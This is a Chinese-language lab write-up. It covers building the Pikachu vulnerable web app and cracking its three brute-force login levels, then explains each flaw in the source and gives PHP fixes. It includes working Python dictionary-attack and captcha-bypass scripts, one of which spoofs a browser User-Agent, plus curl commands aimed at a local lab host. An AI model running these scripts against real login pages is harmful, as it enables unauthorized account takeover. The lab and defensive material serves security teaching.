---
title: '皮卡丘靶场：从零搭建到暴力破解三关'
date: 2026-11-08 15:00:00
updated: 2026-11-08 15:00:00
categories:
  - 网络渗透
tags:
  - 皮卡丘靶场
  - 暴力破解
  - Web安全
  - PHP
  - 验证码绕过
description: 在本机搭起 Pikachu 靶场，连打暴力破解三关，从无防护到"有验证码但答案白送"，最后回到源码写成因与修复。
cover: /img/index-banner.jpg
top_img: /img/index-banner.jpg
---


> Pikachu 是专为 Web 安全入门设计的中文漏洞练习平台，覆盖暴力破解、XSS、SQL 注入、RCE、文件包含等十几类场景，源码托管在 GitHub 上。
>
> 这篇是它的第一段实战：先把靶场在本机搭起来（Apache + PHP + MariaDB，三个必踩的坑），再打暴力破解的四个关卡——从"完全没有防护"到"有验证码但答案白送"，一步一步看清**防护到底装错了哪个位置**。最后回到源码，把每一关的成因和修复代码写出来。
>
> 环境：Kali `192.168.23.128` 上跑靶场，宿主机浏览器访问。整套流程不依赖外网。

---

### 目录

- [第 1 站：把靶场搭起来](#第-1-站：把靶场搭起来)
- [第 2 站：暴力破解三关](#第-2-站：暴力破解三关)
- [第 3 站：源码分析 —— 成因与修复](#第-3-站：源码分析-——-成因与修复)
- [附录](#附录)

---

## 第 1 站：把靶场搭起来

### 1.1 为什么还要自己搭一个

Metasploitable 是"老服务全家桶"——攻击面广但都是网络层的老古董（vsftpd 2.3.4、UnrealIRCd、Samba 3.x）。它适合练**服务识别和已知漏洞利用**，但不适合练 **Web 应用漏洞**。

皮卡丘（Pikachu）正好补这一块：它是一个纯 PHP 写的 Web 漏洞练习平台，覆盖 **16 类、几十个** 常见 Web 漏洞场景，中文界面、每个关卡都有源码可读。

**"有源码可读"是它比 Metasploitable 更适合做高阶作业的原因。** 打 Metasploitable 你只能分析"分包被篡改"，打皮卡丘你可以逐行分析"这行代码为什么错"。

### 1.2 环境与源码

| 项目 | 值 |
|---|---|
| 源码 | GitHub `zhuifengshaonianhanlu/pikachu` master 分支，约 3.5 MB |
| 规模 | **111 个 PHP 文件，16 个漏洞大类** |
| 运行时 | Apache 2.4 + PHP **8.4.27** + MariaDB |
| 访问地址 | `http://192.168.23.128/pikachu/` |

**这个靶场 2018 年前后写的，跑在 PHP 8.4 上。** 装之前我先做了一次兼容性体检，因为 PHP 8 移除了一批老函数，撞上就是 Fatal error：

| 被 PHP 8 移除的 | 命中数 |
|---|---|
| `ereg` / `eregi` | 0 |
| `mysql_connect` / `mysql_query`（原 mysql 扩展） | 0 |
| `create_function` | 0 |
| `each()` | 0 |
| `get_magic_quotes_gpc` | 0 |
| `split()` | 1，但那是前端 JavaScript 的 `str.split()`，不是 PHP 的 |

**结论：没有致命不兼容。** 实际跑起来只是少量 `Deprecated` 警告（PHP 8.4 对隐式可空参数等的提示），不影响功能。

#### 怎么区分 Deprecated 和 Fatal

| 第一个词 | 严重程度 | 要不要管 |
|---|---|---|
| `Deprecated:` | 最低。某个写法将来会被移除 | 不用管，忍着 |
| `Warning:` | 中。某处调用有问题但还能继续 | 看情况 |
| `Notice:` | 低。变量未定义之类 | 一般不用管 |
| **`Fatal error:`** | **最高。脚本当场停止** | **必须修** |

**只看第一个词就够了。** 这一条能省掉大量"满屏红字是不是坏了"的慌乱。

### 1.3 搭建六步

把整个流程写成了一个脚本 `setup_pikachu.sh`，走共享目录执行，一条命令：

```bash
sudo bash /mnt/hgfs/share/setup_pikachu.sh
```

它干六件事：

| 步骤 | 内容 | 耗时 |
|---|---|---|
| 0 | 检查共享目录，没挂就自动挂上 | 1 秒 |
| 1 | `apt update` | **1～10 分钟** |
| 2 | 装 `apache2` `php` `php-mysql` `php-gd` `mariadb-server` | **3～8 分钟** |
| 3 | 启动服务、设开机自启 | 几秒 |
| 4 | **改 MariaDB 的 root 认证方式** | 几秒 |
| 5 | 源码拷到 `/var/www/html/pikachu`，上传目录给 777 | 几秒 |
| 6 | 打开 `allow_url_include`、`display_errors`，重启 Apache | 几秒 |

![搭建完成](/img/pikachu-01-setup-done.png)

```
 搭建完成
 PHP 版本:  PHP 8.4.27 (cli) (built: Oct 21 2026 04:47:05) (NTS)
 Kali 本机: http://127.0.0.1/pikachu/
 宿主机访问: http://192.168.23.128/pikachu/
```

#### 第 4 步为什么是关键

这是搭 Pikachu 最常见的坑，值得单独讲。

**现象**：装完打开 `install.php`，一直提示"数据库连接失败"。

**原因**：Kali（Debian 系）新版的 MariaDB 默认让 root 用 **`unix_socket`** 认证——它靠"你是不是 Linux 的 root 用户"来判断身份，不看密码。而 Pikachu 的 `inc/config.inc.php` 里写死了：

```php
$dbuser = 'root';
$dbpass = '';        // 空密码
$host   = '127.0.0.1';   // 走 TCP，不是 socket
```

PHP 用 TCP 连 `127.0.0.1`，MariaDB 拿不到 unix_socket 身份，又没有密码可比对，直接拒绝。

**修法**：把 root 改成"密码认证 + 空密码"：

```sql
ALTER USER 'root'@'localhost' IDENTIFIED VIA mysql_native_password USING PASSWORD('');
FLUSH PRIVILEGES;
```

> 这个配置**只能用在隔离靶场**。生产环境把 root 弄成空密码 + 允许本地 TCP 是自寻死路。

#### `install.php` 里埋着一个陷阱

翻 `install.php` 源码，第一件事是：

```php
drop database if exists pikachu;
```

**它把整个库删掉再重建。** 现在库是空的，无所谓；但等你打到一半、往留言板里插了一堆测试数据之后，千万别回这个页面点按钮——**全部清空**。

装好之后应该把 `install.php` 删掉或改名，这是真实项目上线前的标准动作，顺便也是靶场里的一个自测点。

### 1.4 装完之后有什么

`install.php` 建 5 张表，插两批数据。这几张表后面每关都要用：

| 表 | 内容 | 用在哪 |
|---|---|---|
| `users` | 3 个账号：`admin/123456`（管理员）、`pikachu/000000`、`test/abc123` | 暴力破解、SQL 注入 |
| `member` | 7 条会员数据（vince、allen、kobe…），密码是 `123456` 的 MD5 | SQL 注入拖库 |
| `message` | 留言板 | 存储型 XSS |
| `xssblind` | 盲打 XSS 的收集表 | XSS 盲打（后台不可见，攻击者看不到回显） |
| `httpinfo` | 记录访问者的 IP / UA / Accept | HTTP 头注入 |

**注意一件事**：这些表都是 `ENGINE=MyISAM` + `DEFAULT CHARSET=utf8`。

`utf8` 在 MySQL 里是**三字节**版本，不是完整的 UTF-8（完整的是 `utf8mb4`，四字节）。这一个细节到了"宽字节注入"那一关会变成关键前提——现在先记着有这回事。

---

## 第 2 站：暴力破解三关

### 2.1 先定判别标志，再写脚本

这是整节最重要的方法论，比任何技巧都值钱。

> **爆破的本质不是"不停地试"，而是"每一次试完，能可靠地判断这次对不对"。**
>
> 没有判别标准，你跑一万次也不知道哪个是答案。

所以顺序永远是：

1. **找出"成功"和"失败"在页面上长什么样**（读源码最快）
2. **手工各发一次，验证这两种回显真的会出现**
3. 才写脚本

第一关的源码里，`vul/burteforce/bf_form.php` 只输出两种结果：

```php
$html.= '<p> login success</p>';                      // 第 38 行
$html.= '<p> username or password is not exists～</p>'; // 第 41 行
```

**要的就是这两个字符串。**

#### 验证一下：`submit` 字段漏了会怎样

第一次发请求时，命令是这样的：

```bash
curl -s -d "username=admin&password=123456" http://192.168.23.128/pikachu/vul/burteforce/bf_form.php
```

**屏幕上什么都没输出。** grep 一条都没抓到。

![缺 submit](/img/pikachu-09-pit2-no-submit.png)

原因在源码第 25 行：

```php
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){
```

服务器第一件事是问"**有没有 `submit` 这个字段**"。没发，这个 `if` 直接为假，整段登录逻辑根本没执行——页面只渲染了一个空表单。

**这是"请求发出去了，但服务器没进分支"，跟"攻击失败"完全是两回事。** 判断方法：**看返回长度有没有变化**。正常页面约 34 KB，进了判断分支会多几十个字节。

补上就好了。真实的表单提交，浏览器会把**所有带 `name` 属性的 input** 都塞进请求体，包括那个提交按钮：

| 页面元素 | name | 值 |
|---|---|---|
| Username 输入框 | `username` | 你填的 |
| Password 输入框 | `password` | 你填的 |
| **Login 按钮** | **`submit`** | **按钮上那个字 `Login`** |

**按钮也算一个字段**，这是新手最容易漏的。以后对着任何表单写脚本，正确做法是：**先在浏览器 F12 的「网络」面板里提交一次，看请求体里到底有几个键，照抄。**

补上之后：

```bash
curl -s -d "username=admin&password=123456&submit=Login" http://192.168.23.128/pikachu/vul/burteforce/bf_form.php | grep -E "login success|not exists"
```

![判别标志](/img/pikachu-02-success-mark.png)

```
<p> login success</p>
```

**判别标志确认了。**

---

### 2.2 第一关：基于表单的暴力破解（无任何防护）

#### 能爆破的四个条件

| 条件 | 这一关 |
|---|---|
| 没有验证码 | ✓ |
| 没有失败次数限制 | ✓ |
| 没有账号锁定 | ✓ |
| 没有速率限制 | ✓ |
| **成功/失败回显可区分** | ✓ |

**前三个决定"值不值得爆"，最后一个决定"能不能自动化"。** 缺了最后一个，你就得人眼看着屏幕判断，那就不是工具了。

#### 脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
皮卡丘靶场 · 第一关：基于表单的暴力破解
目标：http://192.168.23.128/pikachu/vul/burteforce/bf_form.php
"""
import sys
import time
from urllib import request, parse
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://192.168.23.128/pikachu/vul/burteforce/bf_form.php"
USERNAME = "admin"
THREADS = 1          # 改成 20 就是并发版
TIMEOUT = 5
SUCCESS_MARK = "login success"

# 真实场景用 rockyou.txt（Kali 自带：/usr/share/wordlists/rockyou.txt.gz）
DEFAULT_WORDS = [
    "123456789", "password", "12345678", "qwerty", "123456",
    "1234567", "111111", "123123", "abc123", "000000",
    "admin", "letmein", "654321", "666666", "888888",
    "iloveyou", "password1", "123qwe", "sunshine", "monkey",
    "dragon", "master", "welcome", "shadow", "football",
    "superman", "1q2w3e4r", "zxcvbnm", "asdfgh", "qazwsx",
]


def try_login(password):
    """发一次登录请求。返回 True 表示这个密码对了。"""
    data = parse.urlencode({
        "username": USERNAME,
        "password": password,
        "submit": "Login",          # 漏了这个字段，服务器根本不进登录分支
    }).encode()

    req = request.Request(TARGET, data=data, method="POST")
    # 伪装成浏览器：urllib 默认 UA 是 "Python-urllib/3.x"，等于自报是脚本
    req.add_header("User-Agent",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.0.0 Safari/537.36")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")

    with request.urlopen(req, timeout=TIMEOUT) as resp:
        body = resp.read().decode("utf-8", errors="ignore")
    return SUCCESS_MARK in body


def main():
    words = DEFAULT_WORDS
    if len(sys.argv) > 1:
        with open(sys.argv[1], encoding="utf-8", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip()]

    print("[*] 目标   : %s" % TARGET)
    print("[*] 用户名 : %s" % USERNAME)
    print("[*] 字典   : %d 条" % len(words))
    print("[*] 线程   : %d" % THREADS)
    print("-" * 60)

    t0 = time.time()
    hit = None
    done = 0

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = [(pool.submit(try_login, w), w) for w in words]
        for fut, w in futures:
            done += 1
            try:
                ok = fut.result()
            except Exception as e:
                print("[-] %-14s 请求异常: %s" % (w, e))
                continue

            if ok:
                hit = w
                print("[+] %-14s <<<<< 密码正确" % w)
                break

            if THREADS == 1 or done % 10 == 0:
                print("[-] %-14s 不对" % w)

    cost = time.time() - t0
    print("-" * 60)
    if hit:
        print("[+] 爆破成功 : %s / %s" % (USERNAME, hit))
        print("[+] 尝试 %d 次, 耗时 %.2fs, 速度 %.1f 次/秒"
              % (done, cost, done / cost if cost > 0 else 0))
    else:
        print("[-] 字典跑完未命中, 尝试 %d 次, 耗时 %.2fs" % (done, cost))


if __name__ == "__main__":
    main()
```

#### 结果

![爆破成功1](/img/pikachu-03-brute-1.png)

```
[*] 目标   : http://192.168.23.128/pikachu/vul/burteforce/bf_form.php
[*] 用户名 : admin
[*] 字典   : 30 条
[*] 线程   : 1
------------------------------------------------------------
[-] 123456789      不对
[-] password       不对
[-] 12345678       不对
[-] qwerty         不对
[+] 123456         <<<<< 密码正确
------------------------------------------------------------
[+] 爆破成功 : admin / 123456
[+] 尝试 5 次, 耗时 0.07s, 速度 75.4 次/秒
```

**重点不是"成功了"，是最后那一行 `75.4 次/秒`。**

换算一下：

| 场景 | 需要多久 |
|---|---|
| 30 条小字典 | 0.4 秒 |
| `rockyou.txt` 1400 万条，单线程 | **约 51 小时** |
| 同上，20 线程 | 约 5 小时 |
| 同上，20 线程 + 目标在外网（延迟 100 ms） | 约 2～4 天 |

**这就是"没有失败限制"的真实代价**：不需要更聪明的算法，只需要时间。而攻击者有的是时间——一个晚上、一台普通电脑、一个公开字典，就能试完 1400 万个人类最常用的密码。

**防守方的解法只有一个：让"试错"这件事变贵。** 限流、锁定、验证码、异常检测，都是同一个思路的不同实现。

#### 代码里两个值得说的设计

| 位置 | 为什么 |
|---|---|
| `req.add_header("User-Agent", Chrome...)` | urllib 默认 UA 是 `Python-urllib/3.x`，等于举着牌子说"我是脚本"。有些站直接按 UA 封 |
| `break`（命中立即退出） | 继续跑没意义，而且会白白多出几万条日志、几万次告警 |

`THREADS = 1` 是故意的：**单线程时输出顺序和字典顺序完全一致**，方便对着看。改成 20 就是并发版，但输出会乱——这是下一节的事。

---

### 2.3 第二关：验证码绕过（on server）

#### 一个验证码要有效，必须同时满足三个条件

| 条件 | 意思 |
|---|---|
| ① 每次都是新的 | 用过一次就作废 |
| ② 只校验一次 | 校验完立即销毁 |
| ③ **答案不能回到客户端** | 客户端只能看到图片，看不到答案 |

**这一关缺了 ① 和 ③。**

#### 第 1 步：让它自己把答案交出来

三条命令，按顺序：

```bash
# ① 建会话，拿 PHPSESSID
curl -s -c ck.txt -o /dev/null http://192.168.23.128/pikachu/vul/burteforce/bf_server.php

# ② 请求验证码图片，同时把服务器下发的 cookie 打出来
curl -s -b ck.txt -c ck.txt -o /dev/null -D - http://192.168.23.128/pikachu/inc/showvcode.php | grep -i "set-cookie"
```

![验证码泄露](/img/pikachu-04-vcode-leak.png)

```
Set-Cookie: bf[vcode]=e1atv5
```

**我请求的是一张图片，服务器却顺手把这张图的答案发给了我。**

`-D -` 这个参数是"把响应头打到屏幕上"（D = dump-header），`-o /dev/null` 把图片本体丢掉——**我不看图，我只看头。**

> 为什么只出现一行 `Set-Cookie`？因为第一步请求 `bf_server.php` 时，服务器已经下发过 `PHPSESSID` 并存进了 `ck.txt`。第二步带着它去，服务器认得我，就不再发一遍。**没有新的 `Set-Cookie`，恰恰说明会话保持成功。** 这个道理在系列第一篇的 DVWA 一节验证过一次。

#### 第 2 步：找到源码里的那一行

`inc/showvcode.php` 第 7 行：

```php
setcookie('bf[vcode]', $_SESSION['vcode']);
```

**验证码的明文被写进 cookie 发给客户端了。**

而且作者自己在上一行留了注释：

```php
//验证码绕过 on server 这里其实还是有一个问题,就是服务端将验证码字符串以明文COOKIE的方式给了前端,那验证码还有什么鸟意义。。。
```

**作者自己都清楚。这就是"验证码形同虚设"最标准的形态——它防的是人，不防脚本。**

#### 第 3 步：证明"一个码能用到底"

拿这个码去登录，**密码故意写错**：

```bash
curl -s -b ck.txt -d "username=admin&password=zzz&vcode=e1atv5&submit=Login" \
  http://192.168.23.128/pikachu/vul/burteforce/bf_server.php \
  | grep -E "验证码输入错误|login success|not exists"
```

注意这里的 grep 模式，我踩过一次坑：

![grep 噪音](/img/pikachu-10-pit3-grep-noise.png)

第一次写的是 `grep -E "验证码|login success|not exists"`，结果匹配出一大堆无关的行——**因为"验证码"这三个字在整个页面里到处都是**：导航菜单有"验证码绕过(on server)"、输入框有 `placeholder="验证码"`、提示气泡里也有。

**判别字符串必须选"只在出错时才出现"的那种。** `验证码输入错误` 这五个字只有校验失败才出现，`验证码` 不是。

改成精确匹配后，输出就只有一行：

```
<p> username or password is not exists～</p>
```

**验证码通过了，只是密码错。**

#### 第 4 步：同一个码连按三次

命令不改，按 `↑` 调出上一条，回车。**三次。**

![验证码复用](/img/pikachu-05-vcode-reuse.png)

```
not exists      ← 第 1 次
not exists      ← 第 2 次，同一个 e1atv5
not exists      ← 第 3 次，还是它
not exists      ← 第 4 次，还是它
```

**四次全过。验证码只有第一次有意义，之后它就是个摆设。**

技术上说明的是：`bf_server.php` 第 36 行校验完之后，**从来没有 `unset($_SESSION['vcode'])`**。而代码里紧挨着就有一句注释：

```php
//应该在验证完成后,销毁该$_SESSION['vcode']
```

**"应该"两个字，就是漏洞。**

这个码会一直挂在 session 里，直到 PHP 自己回收（取决于 `session.gc_maxlifetime`，默认 24 分钟到几小时）。在这段时间内，它是无限次有效的通行证。

#### 第 5 步：脚本跑字典

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
皮卡丘靶场 · 第二关：验证码绕过（on server）

两个利用点：
  1. showvcode.php 把验证码明文写进 cookie bf[vcode] —— 读 cookie 就得答案
  2. 校验后不销毁 $_SESSION['vcode'] —— 一个码用到底

流程：GET 登录页（拿 PHPSESSID）-> GET 验证码图（vcode 进 cookie）
      -> 从 cookie 读验证码 -> 同一个码反复试密码
"""
import sys
import time
from urllib import request, parse
import http.cookiejar

BASE = "http://192.168.23.128/pikachu"
LOGIN_URL = BASE + "/vul/burteforce/bf_server.php"
VCODE_URL = BASE + "/inc/showvcode.php"

USERNAME = "pikachu"
TIMEOUT = 5

DEFAULT_WORDS = [
    "123456789", "password", "12345678", "qwerty", "123456",
    "1234567", "111111", "123123", "abc123", "000000",
    "admin", "letmein", "654321", "666666", "888888",
]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")


def build_session():
    """建一个带 cookie 的 opener，并把验证码从 cookie 里读出来。"""
    jar = http.cookiejar.CookieJar()
    opener = request.build_opener(request.HTTPCookieProcessor(jar))
    opener.addheaders = [("User-Agent", UA)]

    opener.open(LOGIN_URL, timeout=TIMEOUT).read()   # 拿 PHPSESSID
    opener.open(VCODE_URL, timeout=TIMEOUT).read()   # 生成验证码 -> 明文进 cookie

    sess = ""
    vcode = None
    for c in jar:
        if c.name == "PHPSESSID":
            sess = c.value
        if c.name == "bf[vcode]":
            vcode = c.value
    return opener, sess, vcode


def main():
    opener, sess, vcode = build_session()

    print("[*] 目标   : %s" % LOGIN_URL)
    print("[*] 用户名 : %s" % USERNAME)
    print("[*] 会话   : PHPSESSID=%s" % sess)
    print("[*] 验证码 : %s   <<<<< 从 cookie bf[vcode] 直接读到，没有做任何识别"
          % vcode)
    print("-" * 66)

    if not vcode:
        print("[-] 没读到 bf[vcode]，这个版本可能修了。脚本到此为止。")
        return

    t0 = time.time()
    hit = None
    done = 0

    for password in DEFAULT_WORDS:
        done += 1
        data = parse.urlencode({
            "username": USERNAME,
            "password": password,
            "vcode": vcode,          # 每次都用同一个验证码
            "submit": "Login",
        }).encode()

        req = request.Request(LOGIN_URL, data=data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"})
        try:
            body = opener.open(req, timeout=TIMEOUT).read().decode("utf-8", "ignore")
        except Exception as e:
            print("[-] %-12s 请求异常: %s" % (password, e))
            continue

        if "验证码输入错误" in body:
            print("[-] %-12s 验证码被拒，说明服务器这边认不过" % password)
            break

        if "login success" in body:
            hit = password
            print("[+] %-12s <<<<< 密码正确" % password)
            break

        print("[-] %-12s 不对（验证码通过，只是密码错）" % password)

    cost = time.time() - t0
    print("-" * 66)
    if hit:
        print("[+] 爆破成功 : %s / %s" % (USERNAME, hit))
        print("[+] 尝试 %d 次，耗时 %.2fs，全程只用了一个验证码" % (done, cost))
    else:
        print("[-] 未命中，尝试 %d 次" % done)


if __name__ == "__main__":
    main()
```

结果：

![爆破成功2](/img/pikachu-06-brute-2.png)

```
[*] 目标   : .../bf_server.php
[*] 用户名 : pikachu
[*] 会话   : PHPSESSID=986637bf3c3e5ba5d357667c6b472537
[*] 验证码 : dyei53   <<<<< 从 cookie bf[vcode] 直接读到，没有做任何识别
------------------------------------------------------------------
[-] 123456789      不对（验证码通过，只是密码错）
...
[+] 000000         <<<<< 密码正确
------------------------------------------------------------------
[+] 爆破成功 : pikachu / 000000
[+] 尝试 10 次，耗时 0.01s，全程只用了一个验证码
```

**这一关的灵魂是第二行那句"没有做任何识别"。**

真实场景里，图片验证码要靠 OCR 或打码平台，成本高、准确率还低，而且能靠"加噪点、加干扰线"防住。**这里服务器主动把答案告诉我，防护等于零。**

注意脚本里还有一处设计：遇到 `验证码输入错误` 就 `break`。**这不是为了"跑得更久"，而是为了"失败得清楚"**——如果服务器那边真的开始拒绝，脚本会立刻停下并告诉我"认不过"，而不是闷头跑完整个字典、给我一个假的"未命中"。

---

### 2.4 第三关：验证码绕过（on client）

#### 这一关的性质变了

前两关是"防护没做好"，这一关是**防护装错了地方**——挂在了浏览器里。

看源码，验证码是**浏览器自己生成的**（`bf_client.php` 第 134-149 行）：

```javascript
function createCode() {
    code = "";
    var codeLength = 5;
    ...
    code += selectChar[charIndex];
    ...
    checkCode.value = code;   // 直接写进页面的输入框
}
```

**它是用 `Math.random()` 生成的一串字符，然后据实写进页面的一个输入框。它连图片都不是——就是一串可复制的文字。**

而校验在这里（第 151-164 行）：

```javascript
function validate() {
    var inputCode = document.querySelector('#bf_client .vcode').value;
    if (inputCode.length <= 0) { alert("请输入验证码！"); return false; }
    else if (inputCode != code) { alert("验证码输入错误！"); createCode(); return false; }
    else { return true; }
}
```

`onsubmit="return validate();"` —— **只有浏览器在提交前会调用它。**

然后看服务器端（第 22-51 行）：它只读 `username`、`password`，**从头到尾没有出现过 `$_POST['vcode']` 这个词。**

#### 一句话总结

> **验证码只存在于客户端，服务器不知道有这回事。**

#### 动手验证：干脆不发验证码

```bash
curl -s -d "username=test&password=abc123&submit=Login" \
  http://192.168.23.128/pikachu/vul/burteforce/bf_client.php \
  | grep -E "login success|not exists"
```

![无验证码直连](/img/pikachu-07-no-vcode.png)

```
<p> login success</p>
```

**这条命令里没有 `vcode` 这个字段，一个字节都没有。**

服务器连"有没有验证码"都不问。我在浏览器里被 JS 拦住，只因为我用的是浏览器；**curl 不认识 `onsubmit`。**

#### 浏览器里怎么亲手看见它

三个动作，任何一个都能证明：

| 动作 | 你会看到 |
|---|---|
| 鼠标拖一下那个"验证码" | **能选中变蓝 → 它是文字，不是图片** |
| 点它一下 | 变了。`onclick="createCode()"` 在本地重新生成 |
| F12 → Console → 敲 `code` 回车 | **当前验证码直接打印出来**。全局变量就摆在那儿 |

真实验证码是图片，选不中、复制不了、也读不到变量。

#### 脚本：第一关的原样复用

```bash
cp ~/bf_pikachu.py ~/bf_pikachu3.py
sed -i 's|bf_form.php|bf_client.php|; s|USERNAME = "admin"|USERNAME = "test"|' ~/bf_pikachu3.py
python3 ~/bf_pikachu3.py
```

**只改了两处：URL 里的文件名、用户名。**

为什么能直接用？**因为这一关没有任何需要"绕过"的东西——服务器压根不设防。** 一份代码改两行就打穿了，这本身就说明了它的防护水平：它连让攻击者"多做一点事"都做不到。

---

### 2.5 三关对比

| | 第一关 | 第二关 | 第三关 |
|---|---|---|---|
| 防护机制 | **完全没有** | 有，但答案泄漏 + 不销毁 | **只在前端，服务器不校验** |
| 绕过手法 | 直接爆破 | 读 cookie 拿答案，一码用到底 | **不发验证码字段** |
| 脚本改动 | — | 加会话 + 读 cookie | **只改 URL** |
| 修复方向 | 加验证码 / 限流 / 锁定 | 销毁 session、不下发 cookie | **服务器端必须自己校验** |
| 危害 | 一样 | 一样 | 一样 |

三行连起来是一句话：

> **任何只在客户端做的校验，都不算校验。**

这句话你以后会在 XSS、CSRF、越权、文件上传里反复遇到——**它们全是同一件事的不同变体**：把"信任"交给了攻击者能控制的地方。

---

## 第 3 站：源码分析 —— 成因与修复

前面打的每一关，都在这里变成"为什么错"和"怎么改"。

### 3.1 成因分类

把暴力破解这三关拆开看，一共四种成因。**它们的共同点是都不在"密码对不对"上，而在"校验过程设计得对不对"上。**

| # | 成因类型 | 本次案例 | 一句话本质 |
|---|---|---|---|
| 1 | **缺少失败次数限制** | 第一关，无任何防护 | 试错成本为零 |
| 2 | **敏感数据下发到客户端** | `setcookie('bf[vcode]', ...)` | 把答案和题目一起发出去 |
| 3 | **校验后未失效** | `$_SESSION['vcode']` 不 unset | 一次性凭据变成永久凭据 |
| 4 | **安全控制放在客户端** | 前端 JS 生成/校验验证码 | 攻击者能改的东西不算防线 |

**第 2、3、4 其实是同一族**：都属于"信任边界画错了"。区别只在错在哪里——错在"发出去"、错在"不回收"、错在"根本没在服务端"。

这一族漏洞最难防，因为它们**看起来都做了防护**。防火墙买了、验证码上了、加密也配了，但某一处细节做错，整层防护归零。真实系统里这类问题比"完全没做防护"多得多。


### 3.2 逐条修复

#### 修复 1：让试错变贵（对应第一关）

```php
// 反面：现在这样，什么都不做
if (login_ok($u, $p)) { echo "login success"; }
else { echo "not exists"; }
```

```php
// 正面：四层一起上
session_start();

// ① 计数：同一账号 + 同一 IP，5 分钟内最多 5 次
$key = 'fail:' . $u . ':' . $_SERVER['REMOTE_ADDR'];
$_SESSION[$key] = ($_SESSION[$key] ?? 0) + 1;
if ($_SESSION[$key] > 5) {
    sleep(2);                                  // ② 延迟，拉高单次成本
    exit('尝试次数过多，请 5 分钟后再试');
}

// ③ 统一回显：不告诉攻击者"是账号错还是密码错"
if (login_ok($u, $p)) {
    unset($_SESSION[$key]);
    echo "login success";
} else {
    echo "用户名或密码错误";     // 和上面不复用任何前缀，避免被时序或文本区分
}

// ④ 记录日志：为后续的异常检测留数据
error_log(sprintf("login fail user=%s ip=%s ua=%s", $u, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']));
```

**注意 ③ 那一条的理由。** 原始代码区分"账号不存在"和"密码错误"，看起来只是措辞问题，实际上它允许攻击者**先枚举出哪些账号存在**，再针对性地爆破——成本又降了一半。

**这四条合起来的目标不是"让爆破不可能"，而是"让爆破的时间成本超过密码的有效期"。** 如果密码每 90 天换一次，攻击者需要跑 100 天，那这条防线就够了。

#### 修复 2 & 3：验证码的正确实现

```php
// 生成（showvcode.php）—— 反面示范
setcookie('bf[vcode]', $_SESSION['vcode']);   // ← 答案不能发给客户端
```

```php
// 正确做法
session_start();
$code = substr(str_shuffle('abcdefghjkmnpqrstuvwxyz23456789'), 0, 5);
$_SESSION['vcode']      = strtolower($code);
$_SESSION['vcode_time'] = time();             // ← 记时间，为过期做准备
// 只把图输出给客户端，不把 $code 放进任何响应头 / cookie / HTML
```

```php
// 校验（bf_server.php）
$ok = isset($_POST['vcode'], $_SESSION['vcode'])
   && strtolower(trim($_POST['vcode'])) === $_SESSION['vcode']
   && (time() - $_SESSION['vcode_time']) < 300;      // 5 分钟过期

unset($_SESSION['vcode'], $_SESSION['vcode_time']);  // ← 无论成败，先销毁

if (!$ok) {
    exit('验证码错误或已过期，请刷新');
}
```

**三处关键：**

| 关键点 | 为什么 |
|---|---|
| `unset` 放在判断**之前** | 无论成功还是失败都作废。放在之后，失败路径就是个"可以无限重试"的后门 |
| 记时间戳 | 光销毁不够，攻击者可以不停地拿新码。加过期时间才能限制"一个码的生命周期" |
| **失败也刷新验证码** | 否则攻击者能对同一个码做定向爆破 |

第三条最容易被忽略：**验证码的作用是"限制尝试次数"，不是"限制单次请求"。** 一次校验失败就作废，攻击者就必须为每一次尝试重新取一张图——OCR 的成本瞬间被放大 N 倍。

#### 修复 4：所有校验必须在服务端重做

```javascript
// 前端：只管用户体验，不是安全边界
function validate() {
    if (inputCode !== code) { alert("验证码错误"); return false; }
    return true;      // ← 这一句只是"放行到服务器"，不代表任何校验通过
}
```

```php
// 服务端：必须自己再判断一次
if (!check_vcode($_POST['vcode'] ?? '')) {
    exit('验证码错误');
}
```

**判断标准很简单：把前端那行 JS 删掉以后，攻击还能不能成功？**

- 能成功 → 前端那行从来就不是防线，只是装饰
- 不能成功 → 说明服务端有兜底，前端那行才是可选的

**记住一句话：前端的校验只服务于"用户不要犯错"，不服务于"阻止攻击者"。** 浏览器的开关、隐藏字段、`disabled` 属性、JS 生成的 token、`maxlength`，全部可以被绕过——因为它们全在攻击者的机器上跑。

### 3.3 顺手记下的两个代码级 bug

这两个不影响安全，但它们是**同一类错误的两种形态**，写进报告能体现"真的读了源码"。

**① 赋值写成比较**

`bf_form.php` 第 14 行：

```php
if ($SELF_PAGE = "bf_form.php"){      // 用的是 =，不是 ==
```

本意是"如果当前页是 bf_form.php 就高亮菜单"，实际是**每次赋值都返回真值，条件永远成立**。

**这个 bug 无害，但它的严重版本是致命的**：

```php
if ($is_admin = true) {     // 想写 ==，写成 =，所有人都是管理员
    allow();
}
```

**② 明文比较验证码的大小写处理**

`bf_server.php` 用 `strtolower()` 做比较，说明作者考虑过"用户可能输大写"。这个思路是对的——**问题不在校验逻辑，而在答案泄露和不作废**。

**这就是"部分正确"最值得写的地方：** 一个文件里，作者用了预处理语句防住 SQL 注入（`prepare` + `bind_param`，第一关确实防住了），却在同一个文件里漏掉了失败限制——**安全做对了一处，漏了一处，等于没做。**

---

## 附录

### A. 脚本清单


| 文件 | 作用 | 行数 |
|---|---|---|
| `bf_pikachu.py` | 第一关爆破（`THREADS=1` 顺序 / 改 20 并发） | 109 |
| `bf_pikachu2.py` | 第二关：读 cookie 拿验证码 + 一码跑字典 | 122 |
| `bf_pikachu3.py` | 第三关：第一关脚本改两行 | 109 |
| `setup_pikachu.sh` | 皮卡丘一键搭建（六步） | — |

### B. 命令速查


```bash
# ---- 表单提交（别忘 submit） ----
curl -s -d "username=admin&password=123456&submit=Login" <URL> | grep "login success"

# ---- 会话与 cookie ----
curl -s -c ck.txt -o /dev/null <登录页>
curl -s -b ck.txt -c ck.txt -o /dev/null -D - <验证码图地址> | grep -i set-cookie

# ---- 共享目录 ----
sudo mkdir -p /mnt/hgfs
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
